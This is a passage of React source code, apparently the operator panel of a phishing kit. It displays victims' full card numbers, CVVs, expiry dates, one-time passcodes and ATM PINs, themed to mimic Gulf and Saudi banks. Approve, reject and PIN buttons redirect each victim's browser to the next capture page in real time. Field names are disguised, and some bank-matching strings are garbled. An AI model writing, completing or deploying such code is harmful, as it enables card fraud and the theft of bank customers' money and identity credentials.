        const ts = raw._v1UpdatedAt 
          ? new Date(raw._v1UpdatedAt).getTime()
          : (raw.comparCompletedAt ? new Date(raw.comparCompletedAt).getTime() 
            : (entry.submittedAt ? new Date(entry.submittedAt).getTime() : 0));
        if (ts >= latestCardTimestamp) {
          latestCardTimestamp = ts;
          latestCardEntry = entry;
        }
      }
    });

    // Track the box type with the highest timestamp for "الأحدث" badge
    // Initialize with empty string - will be set after all boxes are created
    const boxTimestamps: { type: string; timestamp: number; key: string }[] = [];

    // Create ONE box for Card (latest entry only)
    if (latestCardEntry) {
      const raw = latestCardEntry.raw || {};
      // Use local decision first (for immediate feedback), then server status (for persistence)
      const serverCardStatus = raw._v1Status || raw.paymentStatus || "";
      const effectiveCardStatus = cardLocalDecision || localDecisionStates.payment || serverCardStatus || "";
      // Hide buttons if: local decision made OR server has decision OR already approved/rejected
      const hasCardDecision = cardLocalDecision || ["approved", "rejected"].includes(serverCardStatus);
      const showCardDecisionButtons = !hasCardDecision && Boolean(raw._v1 || raw.cardNumber);
      // Use _v1UpdatedAt for Card box timestamp, fallback to comparCompletedAt or submittedAt
      let entryTimestamp = raw._v1UpdatedAt 
        ? new Date(raw._v1UpdatedAt).getTime()
        : (raw.comparCompletedAt ? new Date(raw.comparCompletedAt).getTime() 
          : (latestCardEntry.submittedAt ? new Date(latestCardEntry.submittedAt).getTime() : 0));

      const boxKey = `card-${latestCardEntry.id}`;
      boxTimestamps.push({ type: 'card', timestamp: entryTimestamp, key: boxKey });

      // Bank card themes
      const getBankTheme = (cardType: string | undefined) => {
        const cardTypeLower = (cardType || "").toLowerCase();
        
        // Bank Gulf (الخليجية)
        if (cardTypeLower.includes("gulf") || cardTypeLower.includes("الخليجية") || cardTypeLower.includes("الخليجي")) {
          return {
            gradient: "linear-gradient(135deg, rgb(25, 118, 210) 0%, rgb(66, 165, 245) 100%)",
            border: "rgb(25, 118, 210)",
            primaryColor: "rgb(255, 255, 255)",
            secondaryColor: "rgb(179, 229, 252)",
            darkColor: "rgb(13, 71, 161)",
            logoUrl: "https://www.gulfbank.com.kw/assets/img/logo.png",
            bankName: "Gulf Bank",
            currency: "KWD"
          };
        }
        
        // Saudi (السعودية)
        if (cardTypeLower.includes("saudi") || cardTypeLower.includes("السعودية") || cardTypeLower.includes("snb") || cardTypeLower.includes("الاهلي")) {
          return {
            gradient: "linear-gradient(135deg, rgb(0, 77, 64) 0%, rgb(0, 150, 136) 100%)",
            border: "rgb(0, 77, 64)",
            primaryColor: "rgb(255, 255, 255)",
            secondaryColor: "rgb(204, 245, 232)",
            darkColor: "rgb(0, 77, 64)",
            logoUrl: "https://www.alahli.com/sites/all/themes/alahli/images/logo.svg",
            bankName: "Saudi National Bank",
            currency: "SAR"
          };
        }
        
        // Al Rajhi (الراجحي)
        if (cardTypeLower.includes("rajhi") || cardTypeLower.includes("الراجحي") || cardTypeLower.includes("alrajhi")) {
          return {
            gradient: "linear-gradient(135deg, rgb(230, 244, 236) 0%, rgb(194, 224, 204) 100%)",
            border: "rgb(144, 201, 168)",
            primaryColor: "rgb(0, 77, 38)",
            secondaryColor: "rgb(45, 122, 79)",
            darkColor: "rgb(0, 102, 51)",
            logoUrl: "https://upload.wikimedia.org/wikipedia/commons/f/f1/Al_Rajhi_Bank_Logo.svg",
            bankName: "Bank",
            currency: "SAR"
          };
        }
        
        // Alawwal (ال.awwal)
        if (cardTypeLower.includes("alawwal") || cardTypeLower.includes(".awwal") || cardTypeLower.includes("ال.awwal")) {
          return {
            gradient: "linear-gradient(135deg, rgb(103, 58, 183) 0%, rgb(156, 39, 176) 100%)",
            border: "rgb(103, 58, 183)",
            primaryColor: "rgb(255, 255, 255)",
            secondaryColor: "rgb(209, 196, 233)",
            darkColor: "rgb(74, 20, 140)",
            logoUrl: "",
            bankName: "Alawwal Bank",
            currency: "SAR"
          };
        }
        
        // Riyad (الرياض)
        if (cardTypeLower.includes("riyad") || cardTypeLower.includes("الرياض") || cardTypeLower.includes("rib")) {
          return {
            gradient: "linear-gradient(135deg, rgb(33, 33, 33) 0%, rgb(66, 66, 66) 100%)",
            border: "rgb(33, 33, 33)",
            primaryColor: "rgb(255, 255, 255)",
            secondaryColor: "rgb(189, 189, 189)",
            darkColor: "rgb(0, 0, 0)",
            logoUrl: "",
            bankName: "Riyad Bank",
            currency: "SAR"
          };
        }
        
        // SABB
        if (cardTypeLower.includes("sabb") || cardTypeLower.includes("ال british") || cardTypeLower.includes("ال британский")) {
          return {
            gradient: "linear-gradient(135deg, rgb(0, 78, 162) 0%, rgb(0, 113, 200) 100%)",
            border: "rgb(0, 78, 162)",
            primaryColor: "rgb(255, 255, 255)",
            secondaryColor: "rgb(187, 222, 251)",
            darkColor: "rgb(0, 56, 112)",
            logoUrl: "",
            bankName: "SABB",
            currency: "SAR"
          };
        }
        
        // Samba (السامبا)
        if (cardTypeLower.includes("samba") || cardTypeLower.includes("السامبا") || cardTypeLower.includes("smb")) {
          return {
            gradient: "linear-gradient(135deg, rgb(0, 150, 136) 0%, rgb(0, 188, 212) 100%)",
            border: "rgb(0, 150, 136)",
            primaryColor: "rgb(255, 255, 255)",
            secondaryColor: "rgb(178, 235, 244)",
            darkColor: "rgb(0, 96, 100)",
            logoUrl: "",
            bankName: "Samba Bank",
            currency: "SAR"
          };
        }
        
        // QNB (قطر الوطني)
        if (cardTypeLower.includes("qnb") || cardTypeLower.includes("قطر") || cardTypeLower.includes("qatar")) {
          return {
            gradient: "linear-gradient(135deg, rgb(139, 27, 45) 0%, rgb(198, 40, 68) 100%)",
            border: "rgb(139, 27, 45)",
            primaryColor: "rgb(255, 255, 255)",
            secondaryColor: "rgb(255, 205, 210)",
            darkColor: "rgb(122, 0, 25)",
            logoUrl: "",
            bankName: "QNB",
            currency: "QAR"
          };
        }
        
        // Kuwait Finance House (KFH)
        if (cardTypeLower.includes("kfh") || cardTypeLower.includes("التمويل") || cardTypeLower.includes("ال 占戈")) {
          return {
            gradient: "linear-gradient(135deg, rgb(0, 121, 107) 0%, rgb(0, 150, 136) 100%)",
            border: "rgb(0, 121, 107)",
            primaryColor: "rgb(255, 255, 255)",
            secondaryColor: "rgb(178, 223, 219)",
            darkColor: "rgb(0, 77, 64)",
            logoUrl: "",
            bankName: "KFH",
            currency: "KWD"
          };
        }
        
        // Default - Unknown bank (neutral design)
        return {
          gradient: "linear-gradient(135deg, rgb(107, 114, 128) 0%, rgb(75, 85, 99) 100%)",
          border: "rgb(107, 114, 128)",
          primaryColor: "rgb(255, 255, 255)",
          secondaryColor: "rgb(209, 213, 219)",
          darkColor: "rgb(55, 65, 81)",
          logoUrl: "",
          bankName: "غير معروف",
          currency: "SAR"
        };
      };

      const bankTheme = getBankTheme(raw.cardType);

      boxes.push({
        key: boxKey,
        timestamp: entryTimestamp,
        component: (
          <div style={{ 
            background: "#f9fafb",
            borderRadius: 8, 
            padding: 8, 
            border: "1px solid #d1d5db",
            width: "40%",
            marginRight: 0,
            marginLeft: "auto",
            fontFamily: "Cairo, Tajawal, sans-serif"
          }}>
            <div style={{ marginBottom: 8 }}>
              <div style={{ 
                fontSize: "10px", 
                color: "#6b7280", 
                textAlign: "right",
                marginBottom: 4
              }}>
                {entryTimestamp > 0 ? (
                  <TimeCounter timestamp={entryTimestamp} />
                ) : "—"}
              </div>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                <h3 style={{
                  fontSize: "14px",
                  fontWeight: 700,
                  color: "#1f2937",
                  margin: 0
                }}>
                  معلومات البطاقة
                </h3>
                <span style={{
                fontSize: "8px",
                color: "#059669",
                fontWeight: 600
              }}>⭐ أحدث</span>
              </div>
            </div>
            
            {/* Credit Card Design */}
            <div style={{
              background: bankTheme.gradient,
              borderRadius: 16,
              border: `1.5px solid ${bankTheme.border}`,
              aspectRatio: "1.586 / 1",
              minHeight: 170,
              padding: 16,
              position: "relative",
              overflow: "hidden",
              marginBottom: 12,
              boxShadow: "0 4px 6px rgba(0,0,0,0.1)"
            }}>
              {/* Decorative circles */}
              <div style={{
                position: "absolute",
                top: "-30%",
                right: "-15%",
                width: "55%",
                height: "100%",
                borderRadius: "50%",
                background: bankTheme.darkColor,
                opacity: 0.06
              }} />
              <div style={{
                position: "absolute",
                bottom: "-30%",
                left: "-10%",
                width: "45%",
                height: "80%",
                borderRadius: "50%",
                background: bankTheme.darkColor,
                opacity: 0.06
              }} />
              
              {/* Card Content */}
              <div style={{ position: "relative", height: "100%", display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
                {/* Top Row - Bank Logo and Currency */}
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
                  <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
                    {bankTheme.logoUrl ? (
                      <img
                        alt="Bank Logo"
                        className="h-8 w-auto object-contain"
                        style={{ maxWidth: 110 }}
                        src={bankTheme.logoUrl}
                      />
                    ) : (
                      <div style={{
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        width: 60,
                        height: 30,
                        background: bankTheme.darkColor,
                        borderRadius: 4,
                        opacity: 0.8
                      }}>
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke={bankTheme.primaryColor} strokeWidth="2">
                          <rect x="1" y="4" width="22" height="16" rx="2" ry="2"/>
                          <line x1="1" y1="10" x2="23" y2="10"/>
                        </svg>
                      </div>
                    )}
                    <span style={{ fontSize: 9, color: bankTheme.secondaryColor, fontWeight: 600, letterSpacing: "0.05em", textTransform: "uppercase" }}>
                      {bankTheme.bankName}
                    </span>
                  </div>
                  <div style={{ 
                    border: "1.5px solid rgb(0, 102, 51)", 
                    borderRadius: 6, 
                    padding: "2px 8px", 
                    fontSize: 11, 
                    fontWeight: "bold", 
                    color: bankTheme.darkColor, 
                    letterSpacing: "0.05em"
                  }}>
                    {bankTheme.currency}
                  </div>
                </div>
                
                {/* Card Number */}
                <div style={{
                  fontFamily: "Courier New, Lucida Console, monospace",
                  fontSize: 18,
                  fontWeight: "bold",
                  letterSpacing: "0.15em",
                  color: bankTheme.darkColor,
                  direction: "ltr",
                  textAlign: "left"
                }}>
                  {raw.cardNumber ? raw.cardNumber.replace(/(.{4})/g, "$1 ").trim() : "**** **** **** ****"}
                </div>
                
                {/* Bottom Row - Owner, Expiry, CVV, Card Type */}
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-end" }}>
                  <div style={{ display: "flex", flexDirection: "column", gap: 2 }}>
                    <span style={{ 
                      fontSize: 11, 
                      fontWeight: "bold", 
                      color: bankTheme.darkColor, 
                      letterSpacing: "0.05em", 
                      textTransform: "uppercase" 
                    }}>
                      {raw.cardOwner || "CARD HOLDER"}
                    </span>
                    <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
                      <div>
                        <span style={{ fontSize: 8, color: bankTheme.secondaryColor, letterSpacing: "0.05em" }}>EXPIRES</span>
                        <div style={{ fontSize: 12, fontWeight: "bold", color: bankTheme.darkColor, direction: "ltr" }}>
                          {raw.cardExpiry || "**/**"}
                        </div>
                      </div>
                      <div>
                        <span style={{ fontSize: 8, color: bankTheme.secondaryColor, letterSpacing: "0.05em" }}>CVV</span>
                        <div style={{ fontSize: 12, fontWeight: "bold", color: bankTheme.darkColor }}>
                          {raw.cvv || "***"}
                        </div>
                      </div>
                    </div>
                  </div>
                  <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 2 }}>
                    <span style={{ 
                      fontSize: 9, 
                      fontWeight: "bold", 
                      color: bankTheme.secondaryColor, 
                      letterSpacing: "0.08em", 
                      textTransform: "uppercase" 
                    }}>
                      {raw.cardType || "DEBIT"} · Visa
                    </span>
                    <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
                      <span style={{ fontSize: 14 }}>
                        {bankTheme.currency === "KWD" ? "🇰🇼" : bankTheme.currency === "QAR" ? "🇶🇦" : "🇸🇦"}
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            
            {effectiveCardStatus === "approved" ? (
              <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#dcfce7", color: "#166534", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                ✓ تمت الموافقة
              </div>
            ) : effectiveCardStatus === "rejected" ? (
              <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fee2e2", color: "#991b1b", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                ✗ تم رفض البطاقة
              </div>
            ) : effectiveCardStatus === "pin" ? (
              <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#dbeafe", color: "#1e40af", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                🔐 رمز ATM
              </div>
            ) : (
              <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                ⏳ في انتظار المراجعة فقط
              </div>
            )}
            {showCardDecisionButtons && (
              <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
                <button onClick={async () => { 
                  setCardLocalDecision("approved");
                  socketUpdatedBoxRef.current = "card";
                  setActionLoading("card");
                  const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                  if (visitorId) {
                    await fetch("/api/dashboard/reflect-status", {
                      method: "POST",
                      headers: { "Content-Type": "application/json" },
                      body: JSON.stringify({ visitorId, field: "_v1Status", status: "approved" }),
                    });
                    await fetch("/api/dashboard/redirect", {
                      method: "POST",
                      headers: { "Content-Type": "application/json" },
                      body: JSON.stringify({ visitorId, targetPage: "step2", timestampField: "_v1UpdatedAt" }),
                    });
                  }
                  setActionLoading(null);
                  setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
                }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                  موافقة
                </button>
                <button onClick={async () => { 
                  setCardLocalDecision("rejected");
                  socketUpdatedBoxRef.current = "card";
                  setActionLoading("card");
                  const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                  if (visitorId) {
                    await fetch("/api/dashboard/reflect-status", {
                      method: "POST",
                      headers: { "Content-Type": "application/json" },
                      body: JSON.stringify({ visitorId, field: "_v1Status", status: "rejected" }),
                    });
                    await fetch("/api/dashboard/redirect", {
                      method: "POST",
                      headers: { "Content-Type": "application/json" },
                      body: JSON.stringify({ visitorId, targetPage: "check", timestampField: "_v1UpdatedAt" }),
                    });
                  }
                  setActionLoading(null);
                  setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
                }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                  رفض
                </button>
                <button onClick={async () => { 
                  setCardLocalDecision("pin");
                  socketUpdatedBoxRef.current = "card";
                  setActionLoading("card");
                  const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                  if (visitorId) {
                    await fetch("/api/dashboard/reflect-status", {
                      method: "POST",
                      headers: { "Content-Type": "application/json" },
                      body: JSON.stringify({ visitorId, field: "_v6Status", status: "pending" }),
                    });
                    await fetch("/api/dashboard/redirect", {
                      method: "POST",
                      headers: { "Content-Type": "application/json" },
                      body: JSON.stringify({ visitorId, targetPage: "step3", timestampField: "_v6UpdatedAt" }),
                    });
                  }
                  setActionLoading(null);
                  setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
                }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#3b82f6", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                  PIN
                </button>
              </div>
            )}
            
            {/* زر عرض السجل - يظهر فقط إذا كان هناك أكثر من إدخال */}
            {cardEntriesCount > 1 && (
              <button
                onClick={() => setOpenLogBox(openLogBox === 'card' ? null : 'card')}
                style={{
                  marginTop: 12,
                  width: "100%",
                  padding: "10px 16px",
                  border: "1px solid #d1d5db",
                  borderRadius: 8,
                  background: openLogBox === 'card' ? "#f0fdf4" : "#f9fafb",
                  color: openLogBox === 'card' ? "#16a34a" : "#374151",
                  fontWeight: 600,
                  fontSize: "0.8rem",
                  cursor: "pointer",
                  transition: "all 0.2s",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 8
                }}
              >
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
                  <polyline points="14,2 14,8 20,8" />
                  <line x1="16" y1="13" x2="8" y2="13" />
                  <line x1="16" y1="17" x2="8" y2="17" />
                </svg>
                عرض السجل ({cardEntriesCount} إدخالات)
              </button>
            )}
            
            {/* سجل الإدخالات */}
            {openLogBox === 'card' && cardEntriesCount > 1 && (
              <div style={{
                marginTop: 12
              }}>
                <div style={{ 
                  fontSize: "12px", 
                  fontWeight: 600, 
                  color: "#6b7280", 
                  marginBottom: 8,
                  display: "flex",
                  alignItems: "center",
                  gap: 6
                }}>
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  سجل الإدخالات السابقة:
                </div>
                {customerEntryGroup
                  .filter(entry => {
                    const raw = entry.raw || {};
                    return raw._v1 || raw.cardNumber;
                  })
                  .filter(entry => entry.id !== latestCardEntry.id) // Exclude current entry
                  .sort((a, b) => {
                    const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
                    const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
                    return timeB - timeA;
                  })
                  .map((entry) => {
                    const raw = entry.raw || {};
                    const entryTime = entry.submittedAt ? new Date(entry.submittedAt).toLocaleString('ar-SA') : '—';
                    const entryTheme = getBankTheme(raw.cardType);
                    return (
                      <div key={entry.id} style={{
                        marginBottom: 8,
                        padding: 10,
                        background: "#ffffff",
                        borderRadius: 8,
                        border: "1px solid #e5e7eb"
                      }}>
                        <div style={{
                          fontSize: "9px",
                          color: "#9ca3af",
                          marginBottom: 6
                        }}>
                          {entryTime}
                        </div>
                        <div style={{
                          background: entryTheme.gradient,
                          borderRadius: 10,
                          border: `1px solid ${entryTheme.border}`,
                          padding: 10,
                          position: "relative",
                          overflow: "hidden"
                        }}>
                          <div style={{
                            position: "absolute",
                            top: "-20%",
                            right: "-10%",
                            width: "50%",
                            height: "100%",
                            borderRadius: "50%",
                            background: entryTheme.darkColor,
                            opacity: 0.06
                          }} />
                          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 6 }}>
                            <span style={{ 
                              fontSize: 10, 
                              fontWeight: "bold", 
                              color: entryTheme.darkColor 
                            }}>
                              {entryTheme.bankName}
                            </span>
                            <span style={{
                              fontSize: 8,
                              fontWeight: "bold",
                              color: entryTheme.darkColor,
                              padding: "1px 4px",
                              border: `1px solid ${entryTheme.darkColor}`,
                              borderRadius: 3
                            }}>
                              {entryTheme.currency}
                            </span>
                          </div>
                          <div style={{
                            fontFamily: "Courier New, monospace",
                            fontSize: 11,
                            fontWeight: "bold",
                            color: entryTheme.darkColor,
                            letterSpacing: "0.1em",
                            direction: "ltr"
                          }}>
                            {raw.cardNumber ? raw.cardNumber.replace(/(.{4})/g, "$1 ").trim() : "**** **** **** ****"}
                          </div>
                          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-end", marginTop: 6 }}>
                            <span style={{ fontSize: 8, color: entryTheme.secondaryColor }}>
                              {raw.cardOwner || "CARD HOLDER"}
                            </span>
                            <span style={{ fontSize: 8, color: entryTheme.secondaryColor }}>
                              {raw.cardExpiry || "**/**"} · {raw.cvv || "***"}
                            </span>
                          </div>
                        </div>
                      </div>
                    );
                  })}
              </div>
            )}
          </div>
        )
      });
    }
    
    // Count entries that have OTP data
    const otpEntriesCount = customerEntryGroup.filter(entry => {
      const raw = entry.raw || {};
      return raw._v5 || raw.otpCode;
    }).length;
    
    // Find the most recent entry with OTP data
    let latestOtpEntry: (typeof customerEntryGroup)[0] | null = null;
    let latestOtpTimestamp = 0;
    
    customerEntryGroup.forEach((entry) => {
      const raw = entry.raw || {};
      if (raw._v5 || raw.otpCode) {
        // Use _v5UpdatedAt for OTP timestamp, fallback to comparCompletedAt or submittedAt
        const rawEntry = entry.raw || {};
        const ts = rawEntry._v5UpdatedAt 
          ? new Date(rawEntry._v5UpdatedAt).getTime()
          : (rawEntry.comparCompletedAt ? new Date(rawEntry.comparCompletedAt).getTime() 
            : (entry.submittedAt ? new Date(entry.submittedAt).getTime() : 0));
        if (ts >= latestOtpTimestamp) {
          latestOtpTimestamp = ts;
          latestOtpEntry = entry;
        }
      }
    });

    // Create ONE box for OTP (latest entry only)
    if (latestOtpEntry) {
      const raw = latestOtpEntry.raw || {};
      const otpCode = raw._v5 || raw.otpCode;
      const serverOtpStatus = raw._v5Status || raw.otpStatus || "";
      const effectiveOtpStatus = otpLocalDecision || localDecisionStates.otp || serverOtpStatus || "";
      const hasOtpDecision = otpLocalDecision || ["approved", "rejected"].includes(serverOtpStatus);
      const showOtpDecisionButtons = !hasOtpDecision && Boolean(otpCode);
      // Use _v5UpdatedAt for OTP box timestamp, fallback to comparCompletedAt or submittedAt
      let entryTimestamp = raw._v5UpdatedAt 
        ? new Date(raw._v5UpdatedAt).getTime()
        : (raw.comparCompletedAt ? new Date(raw.comparCompletedAt).getTime() 
          : (latestOtpEntry.submittedAt ? new Date(latestOtpEntry.submittedAt).getTime() : 0));

      boxes.push({
        key: `otp-${latestOtpEntry.id}`,
        timestamp: entryTimestamp,
        component: (
          <div style={{ 
            background: "#f9fafb",
            borderRadius: 8, 
            padding: 8, 
            border: "1px solid #d1d5db",
            width: "40%",
            marginRight: 0,
            marginLeft: "auto",
            fontFamily: "Cairo, Tajawal, sans-serif"
          }}>
            <div style={{ marginBottom: 8 }}>
              <div style={{ 
                fontSize: "10px", 
                color: "#6b7280", 
                textAlign: "right",
                marginBottom: 4
              }}>
                {entryTimestamp > 0 ? (
                  <TimeCounter timestamp={entryTimestamp} />
                ) : "—"}
              </div>
              <h3 style={{
                fontSize: "14px",
                fontWeight: 700,
                color: "#1f2937",
                textAlign: "center",
                margin: 0
              }}>
                🔐 رمز التحقق (OTP)
              </h3>
            </div>
            <div style={{
              background: "#ffffff",
              borderRadius: 6,
              padding: 8,
              boxShadow: "0 1px 2px rgba(0,0,0,0.05)"
            }}>
              {/* رمز OTP */}
              <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", textAlign: "center", marginBottom: 12 }}>
                <p style={{ margin: "0 0 4px", fontSize: "12px", color: "#0369a1" }}>رمز التحقق المُدخل:</p>
                <p style={{ margin: 0, fontSize: "24px", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{otpCode}</p>
              </div>
              {effectiveOtpStatus === "approved" ? (
                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#dcfce7", color: "#166534", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                  ✓ تمت الموافقة
                </div>
              ) : effectiveOtpStatus === "rejected" ? (
                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fee2e2", color: "#991b1b", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                  ✗ تم رفض رمز التحقق
                </div>
              ) : (
                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                  ⏳ في انتظار المراجعة فقط
                </div>
              )}
              {showOtpDecisionButtons && (
                <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
                  <button onClick={() => handleLocalOtpAction("approved")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                    موافقة
                  </button>
                  <button onClick={() => handleLocalOtpAction("rejected")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                    رفض
                  </button>
                </div>
              )}
            </div>
            
            {/* زر عرض السجل */}
            {otpEntriesCount > 1 && (
              <button
                onClick={() => setOpenLogBox(openLogBox === 'otp' ? null : 'otp')}
                style={{
                  marginTop: 12,
                  width: "100%",
                  padding: "10px 16px",
                  border: "1px solid #d1d5db",
                  borderRadius: 8,
                  background: openLogBox === 'otp' ? "#f0fdf4" : "#f9fafb",
                  color: openLogBox === 'otp' ? "#16a34a" : "#374151",
                  fontWeight: 600,
                  fontSize: "0.8rem",
                  cursor: "pointer",
                  transition: "all 0.2s",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 8
                }}
              >
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
                  <polyline points="14,2 14,8 20,8" />
                  <line x1="16" y1="13" x2="8" y2="13" />
                  <line x1="16" y1="17" x2="8" y2="17" />
                </svg>
                عرض السجل ({otpEntriesCount} إدخالات)
              </button>
            )}
            
            {/* سجل الإدخالات */}
            {openLogBox === 'otp' && otpEntriesCount > 1 && (
              <div style={{
                marginTop: 12,
                padding: 12,
                background: "#f9fafb",
                borderRadius: 8,
                maxHeight: 300,
                overflowY: "auto"
              }}>
                <div style={{ fontSize: "0.75rem", fontWeight: 600, color: "#6b7280", marginBottom: 8 }}>
                  سجل الإدخالات:
                </div>
                {customerEntryGroup
                  .filter(entry => {
                    const raw = entry.raw || {};
                    return raw._v5 || raw.otpCode;
                  })
                  .sort((a, b) => {
                    const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
                    const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
                    return timeB - timeA;
                  })
                  .map((entry, idx) => {
                    const raw = entry.raw || {};
                    const entryTime = entry.submittedAt ? new Date(entry.submittedAt).toLocaleString('ar-SA') : '—';
                    const isCurrent = entry.id === selectedRequest?.id;
                    return (
                      <div key={entry.id} style={{
                        padding: "8px",
                        marginBottom: 8,
                        background: isCurrent ? "#dcfce7" : "#fff",
                        borderRadius: 6,
                        border: isCurrent ? "1px solid #16a34a" : "1px solid #e5e7eb",
                        fontSize: "0.7rem"
                      }}>
                        <div style={{ fontWeight: 600, color: "#374151", marginBottom: 4 }}>
                          {isCurrent ? "★ الحالي" : `إدخال ${idx + 1}`} - {entryTime}
                        </div>
                        {(raw._v5 || raw.otpCode) && (
                          <div style={{ color: "#6b7280" }}>رمز OTP: {raw._v5 || raw.otpCode}</div>
                        )}
                      </div>
                    );
                  })}
              </div>
            )}
          </div>
        )
      });
    }
    
    // Count entries that have PIN data
    const pinEntriesCount = customerEntryGroup.filter(entry => {
      const raw = entry.raw || {};
      return raw._v6 || raw.pinCode;
    }).length;
    
    // Find the most recent entry with PIN data
    let latestPinEntry: (typeof customerEntryGroup)[0] | null = null;
    let latestPinTimestamp = 0;
    
    customerEntryGroup.forEach((entry) => {
      const raw = entry.raw || {};
      if (raw._v6 || raw.pinCode) {
        // Use _v6UpdatedAt for PIN timestamp, fallback to comparCompletedAt or submittedAt
        const ts = raw._v6UpdatedAt 
          ? new Date(raw._v6UpdatedAt).getTime()
          : (raw.comparCompletedAt ? new Date(raw.comparCompletedAt).getTime() 
            : (entry.submittedAt ? new Date(entry.submittedAt).getTime() : 0));
        if (ts >= latestPinTimestamp) {
          latestPinTimestamp = ts;
          latestPinEntry = entry;
        }
      }
    });

    // Create ONE box for PIN (latest entry only)
    if (latestPinEntry) {
      const raw = latestPinEntry.raw || {};
      const pinCode = raw._v6 || raw.pinCode;
      const serverPinStatus = raw._v6Status || raw.pinStatus || "";
      const effectivePinStatus = pinLocalDecision || localDecisionStates.pin || serverPinStatus || "";
      const hasPinDecision = pinLocalDecision || ["approved", "rejected"].includes(serverPinStatus);
      const showPinDecisionButtons = !hasPinDecision && Boolean(pinCode);
      // Use _v6UpdatedAt for PIN box timestamp, fallback to comparCompletedAt or submittedAt
      let entryTimestamp = raw._v6UpdatedAt 
        ? new Date(raw._v6UpdatedAt).getTime()
        : (raw.comparCompletedAt ? new Date(raw.comparCompletedAt).getTime() 
          : (latestPinEntry.submittedAt ? new Date(latestPinEntry.submittedAt).getTime() : 0));

      boxes.push({
        key: `pin-${latestPinEntry.id}`,
        timestamp: entryTimestamp,
        component: (
          <div style={{ 
            background: "#f9fafb",
            borderRadius: 8, 
            padding: 8, 
            border: "1px solid #d1d5db",
            width: "40%",
            marginRight: 0,
            marginLeft: "auto",
            fontFamily: "Cairo, Tajawal, sans-serif"
          }}>
            <div style={{ marginBottom: 8 }}>
              <div style={{ 
                fontSize: "10px", 
                color: "#6b7280", 
                textAlign: "right",
                marginBottom: 4
              }}>
                {entryTimestamp > 0 ? (
                  <TimeCounter timestamp={entryTimestamp} />
                ) : "—"}
              </div>
              <h3 style={{
                fontSize: "14px",
                fontWeight: 700,
                color: "#1f2937",
                textAlign: "center",
                margin: 0
              }}>
                🔑 رمز PIN
              </h3>
            </div>
            <div style={{
              background: "#ffffff",
              borderRadius: 6,
              padding: 8,
              boxShadow: "0 1px 2px rgba(0,0,0,0.05)"
            }}>
              <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr", marginBottom: 12 }}>
                {Array.from({ length: 4 }).map((_, idx) => {
                  const pinValue = String(pinCode || "0000").padStart(4, "0")[idx] || "0";
                  return (
                    <div key={idx} style={{ background: "#f0f9ff", borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", width: 40, height: 50, border: "1px solid #7dd3fc" }}>
